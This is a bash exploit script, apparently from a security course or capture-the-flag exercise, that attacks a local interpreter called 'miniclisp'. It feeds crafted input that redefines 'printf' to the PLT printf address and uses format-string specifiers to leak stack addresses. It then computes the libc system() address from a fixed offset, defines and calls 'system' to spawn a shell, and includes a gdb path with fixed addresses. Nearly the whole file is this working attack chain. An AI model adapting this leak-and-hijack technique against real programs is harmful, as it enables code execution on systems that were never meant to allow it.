#!/bin/bash
OUTPUTFILE=output.tmp
MINICLISP=./miniclisp

SYSTEMADDRESS=0
EXPRADDRESS=0

DYNLINE=0;
# Get both addresses form the outputfile
function getadress {
	#Get address of system from outputfile
	SYSTEMADDRESS=$(cat $OUTPUTFILE | grep "> 0x"| head -1 | cut -c 3-)
	
	#GET address of the expression which holds the systemcall
	EXPRADDRESS=$(cat $OUTPUTFILE | grep "> 0x"| tail -1 | cut -c 3-)
}

# build input form  addresses
function getdynamicline {
	#Get line from hexto32byte programm 0x11FDC0 is the difference between IO_STDIN and system
	# and -451 is the difference between the expression found on stack and the address the
	# systemproc will have
	SYSTEMDEF=$(./hexto32byte $SYSTEMADDRESS 0x11FDC0 $EXPRADDRESS -451)
	#A lot of different ways are possible but it is important to keep the $SYSTEMDEF in the stack
	DYNLINE=$(echo -e "(begin (define system $SYSTEMDEF) (printf 0xa6e2433303125) 5)\nsystem\n(system 2666245823313162030)\n")
}

#Calculate addresses from last output just for debugging
getadress
getdynamicline
echo "last output: address system: $SYSTEMADDRESS line: $SYSTEMDEF and address of expr $EXPRADDRESS "
SYSTEMDEF=0
DYNLINE=0

#Define printf.  0x08048660 is printf in plt the %2$p\n and %9$p\n
SHCODE=$'(define printf \x60\x86\x04\x08aaaaaabbbbbbbbbbccccccccccdd)\x0Aprintf\x0A(printf 0xa70243225)\n(printf 0xa70243925)\n'

if [ "$1" == "-g"  ]
then
	#set address for non randoizatied gdb
	SYSTEMADDRESS="0x288440"
	EXPRADDRESS="0x804e878"
	getdynamicline
	echo -e "$SHCODE$DYNLINE" >exploit1.txt
	gdb -ex "set args ARGUMENT < exploit1.txt" $MINICLISP
else
	#Call programm with interactive input
	(echo -e "$SHCODE\n"; sleep 1; getadress; getdynamicline; echo -e "$DYNLINE"; sleep 1000) | $MINICLISP > $OUTPUTFILE
fi
